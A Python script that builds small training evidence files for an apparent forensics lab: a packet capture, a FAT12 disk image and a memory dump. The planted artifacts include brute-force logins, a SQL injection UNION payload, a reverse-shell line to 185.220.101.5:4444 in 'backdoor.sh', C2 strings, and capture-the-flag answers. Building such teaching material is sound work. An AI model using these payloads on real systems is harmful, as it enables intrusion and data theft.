"""
Generate real (but small) forensic evidence files for ForensicsLab.
Run this script once to populate static/evidence/ directories.
"""
import os
import hashlib
import struct
import json
import sys
from datetime import datetime

# Configure UTF-8 encoding for standard output on Windows
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')

BASE = os.path.join(os.path.dirname(__file__), 'static', 'evidence')


def sha256(path):
    h = hashlib.sha256()
    with open(path, 'rb') as f:
        for chunk in iter(lambda: f.read(65536), b''):
            h.update(chunk)
    return h.hexdigest()


def write_file(path, data, mode='wb'):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, mode) as f:
        f.write(data)
    print(f"  [+] Created: {os.path.relpath(path)}")


# ─────────────────────────────────────────
# SCENARIO 1 — Network Forensics
# A minimal valid PCAP file with crafted packets
# ─────────────────────────────────────────
def gen_scenario1():
    d = os.path.join(BASE, 'scenario_1')

    # PCAP file format: Global Header + Packet Records
    # Magic: a1b2c3d4 (little-endian), version 2.4, linktype=1 (Ethernet)
    PCAP_MAGIC    = 0xa1b2c3d4
    PCAP_VER_MAJ  = 2
    PCAP_VER_MIN  = 4
    PCAP_THISZONE = 0
    PCAP_SIGFIGS  = 0
    PCAP_SNAPLEN  = 65535
    PCAP_NETWORK  = 1  # Ethernet

    global_header = struct.pack('<IHHiIII',
        PCAP_MAGIC, PCAP_VER_MAJ, PCAP_VER_MIN,
        PCAP_THISZONE, PCAP_SIGFIGS, PCAP_SNAPLEN, PCAP_NETWORK)

    def eth_ip_tcp(src_ip, dst_ip, src_port, dst_port, flags=0x002, payload=b''):
        """Build a minimal Ethernet+IP+TCP frame."""
        # Ethernet header (14 bytes): dst_mac, src_mac, ethertype=0x0800
        eth = b'\xff\xff\xff\xff\xff\xff' + b'\xc0\xa8\x01\x69' + b'\x00\x00' + b'\x08\x00'
        # IP header (20 bytes)
        def ip_int(s): return int.from_bytes(bytes(int(x) for x in s.split('.')), 'big')
        total_len = 20 + 20 + len(payload)
        ip = struct.pack('>BBHHHBBH4s4s',
            0x45, 0, total_len, 0x1234, 0,
            64, 6, 0,
            ip_int(src_ip).to_bytes(4, 'big'),
            ip_int(dst_ip).to_bytes(4, 'big'))
        # Recompute IP checksum
        def checksum(data):
            s = 0
            for i in range(0, len(data), 2):
                w = (data[i] << 8) + (data[i+1] if i+1 < len(data) else 0)
                s += w
            s = (s >> 16) + (s & 0xffff)
            s += (s >> 16)
            return ~s & 0xffff
        ip = ip[:10] + struct.pack('>H', checksum(ip)) + ip[12:]
        # TCP header (20 bytes)
        tcp = struct.pack('>HHIIBBHHH',
            src_port, dst_port, 0, 0,
            0x50, flags, 65535, 0, 0)
        frame = eth + ip + tcp + payload
        return frame

    def eth_ip_udp(src_ip, dst_ip, src_port, dst_port, payload=b''):
        """Build a minimal Ethernet+IP+UDP frame."""
        # Ethernet header (14 bytes): dst_mac, src_mac, ethertype=0x0800
        eth = b'\xff\xff\xff\xff\xff\xff' + b'\xc0\xa8\x01\x69' + b'\x00\x00' + b'\x08\x00'
        # IP header (20 bytes)
        def ip_int(s): return int.from_bytes(bytes(int(x) for x in s.split('.')), 'big')
        total_len = 20 + 8 + len(payload)
        ip = struct.pack('>BBHHHBBH4s4s',
            0x45, 0, total_len, 0x1234, 0,
            64, 17, 0,  # 17 is UDP
            ip_int(src_ip).to_bytes(4, 'big'),
            ip_int(dst_ip).to_bytes(4, 'big'))
        # Recompute IP checksum
        def checksum(data):
            s = 0
            for i in range(0, len(data), 2):
                w = (data[i] << 8) + (data[i+1] if i+1 < len(data) else 0)
                s += w
            s = (s >> 16) + (s & 0xffff)
            s += (s >> 16)
            return ~s & 0xffff
        ip = ip[:10] + struct.pack('>H', checksum(ip)) + ip[12:]
        # UDP header (8 bytes)
        udp_len = 8 + len(payload)
        udp = struct.pack('>HHHH', src_port, dst_port, udp_len, 0)
        frame = eth + ip + udp + payload
        return frame

    def pcap_packet(ts_sec, ts_usec, data):
        return struct.pack('<IIII', ts_sec, ts_usec, len(data), len(data)) + data

    # Define clean background traffic data
    dns_query_1 = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x01\x00\x01'
    dns_resp_1  = b'\x12\x34\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00\x06google\x03com\x00\x00\x01\x00\x01\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04\x8e\xfa\x4a\x8e'
    dns_query_2 = b'\x56\x78\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06github\x03com\x00\x00\x01\x00\x01'
    dns_resp_2  = b'\x56\x78\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00\x06github\x03com\x00\x00\x01\x00\x01\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04\x8c\x52\x79\x04'

    http_css_req  = b'GET /static/css/style.css HTTP/1.1\r\nHost: 192.168.1.10\r\nUser-Agent: Mozilla/5.0\r\n\r\n'
    http_css_resp = b'HTTP/1.1 200 OK\r\nContent-Type: text/css\r\nContent-Length: 42\r\n\r\nbody { background-color: var(--bg); }'
    http_png_req  = b'GET /static/img/logo.png HTTP/1.1\r\nHost: 192.168.1.10\r\n\r\n'
    http_png_resp = b'HTTP/1.1 200 OK\r\nContent-Type: image/png\r\nContent-Length: 12\r\n\r\nPNG_DATA_HEX'

    packet_list = []
    base_ts = 1716422400  # 2026-05-23

    # Add background noise traffic
    packet_list.append((base_ts + 10, eth_ip_udp('192.168.1.100', '8.8.8.8', 43210, 53, dns_query_1)))
    packet_list.append((base_ts + 11, eth_ip_udp('8.8.8.8', '192.168.1.100', 53, 43210, dns_resp_1)))
    
    packet_list.append((base_ts + 20, eth_ip_tcp('192.168.1.102', '192.168.1.10', 55432, 80, flags=0x002)))
    packet_list.append((base_ts + 21, eth_ip_tcp('192.168.1.102', '192.168.1.10', 55432, 80, flags=0x018, payload=http_css_req)))
    packet_list.append((base_ts + 22, eth_ip_tcp('192.168.1.10', '192.168.1.102', 80, 55432, flags=0x018, payload=http_css_resp)))

    # Normal HTTP GET (attacker first scan)
    http_get = b'GET /index.php?id=1 HTTP/1.1\r\nHost: 192.168.1.10\r\nUser-Agent: Mozilla/5.0\r\n\r\n'
    packet_list.append((base_ts + 65, eth_ip_tcp('192.168.1.105', '192.168.1.10', 53210, 80, flags=0x002)))
    packet_list.append((base_ts + 66, eth_ip_tcp('192.168.1.105', '192.168.1.10', 53210, 80, flags=0x018, payload=http_get)))

    packet_list.append((base_ts + 80, eth_ip_udp('192.168.1.100', '8.8.8.8', 43211, 53, dns_query_2)))
    packet_list.append((base_ts + 81, eth_ip_udp('8.8.8.8', '192.168.1.100', 53, 43211, dns_resp_2)))

    packet_list.append((base_ts + 90, eth_ip_tcp('192.168.1.102', '192.168.1.10', 55433, 80, flags=0x002)))
    packet_list.append((base_ts + 91, eth_ip_tcp('192.168.1.102', '192.168.1.10', 55433, 80, flags=0x018, payload=http_png_req)))
    packet_list.append((base_ts + 92, eth_ip_tcp('192.168.1.10', '192.168.1.102', 80, 55433, flags=0x018, payload=http_png_resp)))

    # Brute force attempts (10 packets)
    for i in range(10):
        bf = f'POST /login.php HTTP/1.1\r\nHost: 192.168.1.10\r\n\r\nuser=admin&pass=attempt{i}'.encode()
        packet_list.append((base_ts + 106 + i, eth_ip_tcp('192.168.1.105', '192.168.1.10', 53210+i, 80, flags=0x018, payload=bf)))

    # SQL Injection payload
    sqli = b'GET /index.php?id=1%27%20UNION%20SELECT%201,username,password%20FROM%20users-- HTTP/1.1\r\nHost: 192.168.1.10\r\n\r\n'
    packet_list.append((base_ts + 135, eth_ip_tcp('192.168.1.105', '192.168.1.10', 53211, 80, flags=0x018, payload=sqli)))

    # HTTP response containing FLAG
    http_resp = b'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nFlag-Payload: FLAG{wire_sh4rk_rules}\r\n\r\n<html>OK</html>'
    packet_list.append((base_ts + 136, eth_ip_tcp('192.168.1.10', '192.168.1.105', 80, 53211, flags=0x018, payload=http_resp)))

    # Sort packets strictly by timestamp for compliance
    packet_list.sort(key=lambda x: x[0])

    packets = b''
    for ts, pkt_data in packet_list:
        packets += pcap_packet(ts, 0, pkt_data)

    pcap_data = global_header + packets
    write_file(os.path.join(d, 'capture_traffic.pcapng'), pcap_data)

    readme = """=== NETWORK FORENSICS LAB ===
Hãy phân tích tệp capture_traffic.pcapng để xác định nguồn gốc và hành vi tấn công mạng.
Gợi ý sử dụng: tshark hoặc tcpdump.
Timestamp: 2026-05-23 08:00:00 UTC
""".encode('utf-8')
    write_file(os.path.join(d, 'readme.txt'), readme)


def gen_scenario2():
    import struct
    d = os.path.join(BASE, 'scenario_2')

    # Total sectors in disk: 4096 sectors = 2 MB
    total_sectors = 4096
    sector_size = 512
    disk = bytearray(total_sectors * sector_size)

    # 1. Write MBR Partition Table at sector 0 (offset 446)
    # 16 bytes for Partition 1
    # Offset 0: active indicator (0x80)
    # Offset 1-3: starting CHS (0x01, 0x01, 0x00)
    # Offset 4: type (0x01 = FAT12)
    # Offset 5-7: ending CHS (0x00, 0x00, 0x00)
    # Offset 8-11: start sector LBA (2048)
    # Offset 12-15: size in sectors (2048)
    struct.pack_into('<B3sB3sII', disk, 446,
                     0x80, b'\x01\x01\x00', 0x01, b'\x00\x00\x00', 2048, 2048)
    # MBR Signature
    disk[510] = 0x55
    disk[511] = 0xAA

    # 2. Write Boot Sector at sector 2048 (offset 2048 * 512 = 1048576)
    part_offset = 2048 * 512
    bs = bytearray(512)
    bs[0:3] = b'\xeb\x3c\x90' # Jump
    bs[3:11] = b'MSWIN4.1' # OEM Name
    struct.pack_into('<H', bs, 11, 512) # Bytes per sector
    bs[13] = 1 # Sectors per cluster
    struct.pack_into('<H', bs, 14, 1) # Reserved sectors
    bs[16] = 2 # Number of FATs
    struct.pack_into('<H', bs, 17, 64) # Root directory entries (64 entries)
    struct.pack_into('<H', bs, 19, 2048) # Total sectors in partition (2048 sectors = 1MB)
    bs[21] = 0xf8 # Media descriptor
    struct.pack_into('<H', bs, 22, 6) # Sectors per FAT (6 sectors)
    struct.pack_into('<H', bs, 24, 32) # Sectors per track
    struct.pack_into('<H', bs, 26, 64) # Number of heads
    struct.pack_into('<I', bs, 28, 0) # Hidden sectors
    struct.pack_into('<I', bs, 32, 0) # Large sectors
    bs[36] = 0x80 # Physical drive number
    bs[37] = 0x00 # Reserved
    bs[38] = 0x29 # Signature
    bs[39:43] = b'\x12\x34\x56\x78' # Volume ID
    bs[43:54] = b'NO NAME    ' # Volume label
    bs[54:62] = b'FAT12   ' # File system type
    bs[510:512] = b'\x55\xaa' # Signature
    disk[part_offset : part_offset + 512] = bs

    # 3. Write FAT tables (FAT1 starts at sector 2049, FAT2 at sector 2055)
    # Cluster 2: lost+found directory (start cluster 2)
    # Cluster 3: hosts file (start cluster 3)
    # Cluster 4: resolv.conf file (start cluster 4)
    # Cluster 5: secret_flag.txt (deleted file, start cluster 5 - FAT entry will be 0x000)
    # Cluster 6: backdoor.sh (start cluster 6)
    
    # Packing:
    # 0 & 1: 0xff8, 0xfff -> bytes F8 FF FF
    # 2 & 3: 0xfff, 0xfff -> bytes FF FF FF
    # 4 & 5: 0xfff, 0x000 -> bytes FF 0F 00
    # 6 & 7: 0xfff, 0x000 -> bytes FF 0F 00
    fat_size = 6 * 512
    fat = bytearray(fat_size)
    fat[0:12] = b'\xf8\xff\xff\xff\xff\xff\xff\x0f\x00\xff\x0f\x00'

    fat1_offset = part_offset + 512
    fat2_offset = part_offset + 512 + fat_size
    disk[fat1_offset : fat1_offset + fat_size] = fat
    disk[fat2_offset : fat2_offset + fat_size] = fat

    # 4. Write Root Directory (starts at sector 2061, size = 64 entries * 32 bytes = 2048 bytes = 4 sectors)
    def calculate_lfn_checksum(sname: bytes) -> int:
        chk = 0
        for b in sname:
            chk = (((chk & 1) << 7) + (chk >> 1) + b) & 0xFF
        return chk

    def make_dir_entry(name_83: bytes, attr: int, start_cluster: int, file_size: int, deleted: bool = False) -> bytearray:
        entry = bytearray(32)
        entry[0:11] = name_83
        if deleted:
            entry[0] = 0xe5
        entry[11] = attr
        struct.pack_into('<H', entry, 26, start_cluster)
        struct.pack_into('<I', entry, 28, file_size)
        return entry

    def make_lfn_entries(long_name: str, sname: bytes, deleted: bool = False) -> list:
        chk = calculate_lfn_checksum(sname)
        chars = list(long_name)
        chars.append('\x00')
        while len(chars) % 13 != 0:
            chars.append('\uffff')
        
        num_entries = len(chars) // 13
        entries = []
        for i in reversed(range(num_entries)):
            seq = (i + 1)
            if i == num_entries - 1:
                seq |= 0x40
            
            e = bytearray(32)
            e[0] = 0xe5 if deleted else seq
            e_chars = chars[i*13 : (i+1)*13]
            
            e[1:11] = ''.join(e_chars[0:5]).encode('utf-16le')
            e[11] = 0x0f # LFN
            e[12] = 0x00
            e[13] = chk
            e[14:26] = ''.join(e_chars[5:11]).encode('utf-16le')
            e[26:28] = b'\x00\x00'
            e[28:32] = ''.join(e_chars[11:13]).encode('utf-16le')
            entries.append(e)
        return entries

    root_dir_offset = part_offset + 512 + (2 * fat_size)
    root_dir = bytearray(2048)
    curr_idx = 0

    def add_entry(entry_bytes):
        nonlocal curr_idx
        root_dir[curr_idx : curr_idx + len(entry_bytes)] = entry_bytes
        curr_idx += len(entry_bytes)

    # Volume Label
    add_entry(make_dir_entry(b'NO NAME    ', 0x08, 0, 0))

    # lost+found directory (start cluster 2)
    lf_sname = b'LOST_F~1   '
    for lfn in make_lfn_entries('lost+found', lf_sname):
        add_entry(lfn)
    add_entry(make_dir_entry(lf_sname, 0x10, 2, 0))

    # hosts file (start cluster 3)
    hosts_content = b"127.0.0.1 localhost\n"
    add_entry(make_dir_entry(b'HOSTS      ', 0x20, 3, len(hosts_content)))

    # resolv.conf file (start cluster 4)
    rc_sname = b'RESOLV~1CON'
    rc_content = b"nameserver 8.8.8.8\n"
    for lfn in make_lfn_entries('resolv.conf', rc_sname):
        add_entry(lfn)
    add_entry(make_dir_entry(rc_sname, 0x20, 4, len(rc_content)))

    # secret_flag.txt (deleted file, start cluster 5)
    sf_sname = b'SECRET~1TXT'
    flag_text = b"FLAG{d1sk_f0r3ns1cs_is_fun}\n"
    for lfn in make_lfn_entries('secret_flag.txt', sf_sname, deleted=True):
        add_entry(lfn)
    add_entry(make_dir_entry(sf_sname, 0x20, 5, len(flag_text), deleted=True))

    # backdoor.sh (start cluster 6)
    bd_sname = b'BACKDOORSH '
    bd_content = b"#!/bin/bash\n# Backdoor persistence\nc -e /bin/bash 185.220.101.5 4444\n"
    add_entry(make_dir_entry(bd_sname, 0x20, 6, len(bd_content)))

    disk[root_dir_offset : root_dir_offset + 2048] = root_dir

    # 5. Write Data Sectors
    data_start_offset = part_offset + 512 + (2 * fat_size) + 2048
    
    # lost+found directory entries (. and ..) in Cluster 2
    c2_offset = data_start_offset + (0 * 512)
    c2_data = bytearray(512)
    c2_data[0:32] = make_dir_entry(b'.          ', 0x10, 2, 0)
    c2_data[32:64] = make_dir_entry(b'..         ', 0x10, 0, 0)
    disk[c2_offset : c2_offset + 512] = c2_data

    # hosts content in Cluster 3
    c3_offset = data_start_offset + (1 * 512)
    disk[c3_offset : c3_offset + len(hosts_content)] = hosts_content

    # resolv.conf content in Cluster 4
    c4_offset = data_start_offset + (2 * 512)
    disk[c4_offset : c4_offset + len(rc_content)] = rc_content

    # secret_flag.txt content in Cluster 5 (data persists!)
    c5_offset = data_start_offset + (3 * 512)
    disk[c5_offset : c5_offset + len(flag_text)] = flag_text

    # backdoor.sh content in Cluster 6
    c6_offset = data_start_offset + (4 * 512)
    disk[c6_offset : c6_offset + len(bd_content)] = bd_content

    write_file(os.path.join(d, 'suspect_disk.E01'), bytes(disk))

    chain_of_custody = """CHAIN OF CUSTODY DOCUMENT
==========================
Case Number: FL-2026-001
Evidence ID: DISK-001
Description: Suspect hard drive image
Acquired: 2026-05-20 09:00:00 UTC
Acquired By: Investigator Nguyen An
Method: FTK Imager - Physical Drive Acquisition
Hash Algorithm: SHA-256
Notes: Drive seized from suspect workstation. No physical damage observed.
==========================
""".encode('utf-8')
    write_file(os.path.join(d, 'chain_of_custody.txt'), chain_of_custody)


# ─────────────────────────────────────────
# SCENARIO 3 — Memory Forensics
# A fake vmem file with embedded strings
# ─────────────────────────────────────────
def gen_scenario3():
    d = os.path.join(BASE, 'scenario_3')

    # Small memory dump with embedded forensics artifacts
    mem_size = 2 * 1024 * 1024  # 2 MB
    mem = bytearray(mem_size)

    # Embed process list simulation strings
    proc_strings = (
        b"System\x004\x00"
        b"services.exe\x001024\x00"
        b"svchost.exe\x003920\x00"
        b"svchost_malicious.exe\x003824\x00C:\\Windows\\Temp\\svchost_malicious.exe\x00"
        b"explorer.exe\x002180\x00"
    )
    mem[0x1000:0x1000+len(proc_strings)] = proc_strings

    # Network connections
    net_strings = (
        b"ESTABLISHED\x00192.168.1.10:49210\x00185.220.101.5:4444\x003824\x00"
        b"LISTENING\x00192.168.1.10:135\x000.0.0.0:0\x00820\x00"
    )
    mem[0x5000:0x5000+len(net_strings)] = net_strings

    # C2 communication strings
    c2_strings = (
        b'GET /commands HTTP/1.1\x00'
        b'Host: 185.220.101.5\x00'
        b'C2 Connection established. Shell spawned.\x00'
        b'FOUND FLAG IN RAM: FLAG{m3m0ry_4n4lys1s_pr0}\x00'
    )
    mem[0x8ff0:0x8ff0+len(c2_strings)] = c2_strings

    # More realistic memory padding with random-ish data
    import random
    random.seed(42)
    for i in range(0x10000, mem_size - 100, 137):
        mem[i] = random.randint(0, 255)

    write_file(os.path.join(d, 'memory_dump.vmem'), bytes(mem))

    readme = """=== MEMORY FORENSICS LAB ===
Phân tích ảnh RAM memory_dump.vmem để tìm các tiến trình độc hại chạy ẩn và các kết nối mạng C2 hoạt động.
Gợi ý sử dụng: volatility3 hoặc strings
Acquired: 2026-05-22 10:05:00 UTC
""".encode('utf-8')
    write_file(os.path.join(d, 'readme.txt'), readme)


# ─────────────────────────────────────────
# Generate SHA-256 manifest for all files
# ─────────────────────────────────────────
def gen_hashes_and_manifest():
    manifest = []
    for scenario_id in [1, 2, 3]:
        folder = os.path.join(BASE, f'scenario_{scenario_id}')
        if not os.path.exists(folder):
            continue
        for fname in sorted(os.listdir(folder)):
            fpath = os.path.join(folder, fname)
            h = sha256(fpath)
            size = os.path.getsize(fpath)
            manifest.append({
                "scenario_id": scenario_id,
                "filename": fname,
                "sha256": h,
                "size": size,
                "generated_at": datetime.utcnow().isoformat()
            })
            # Write individual hash file
            hash_txt_path = os.path.join(folder, fname + '.sha256')
            with open(hash_txt_path, 'w') as hf:
                hf.write(f"{h}  {fname}\n")
            print(f"  [SHA256] {fname}: {h[:16]}...")

    manifest_path = os.path.join(BASE, 'manifest.json')
    with open(manifest_path, 'w') as f:
        json.dump(manifest, f, indent=2)
    print(f"\n  [+] Manifest: {manifest_path}")
    return manifest


if __name__ == '__main__':
    print("\n[ForensicsLab] Generating evidence files...\n")
    print("[Scenario 1] Network Forensics...")
    gen_scenario1()
    print("[Scenario 2] Disk Forensics...")
    gen_scenario2()
    print("[Scenario 3] Memory Forensics...")
    gen_scenario3()
    print("\n[Hashing] Computing SHA-256 checksums...")
    gen_hashes_and_manifest()
    print("\n[+] Evidence generation complete!")
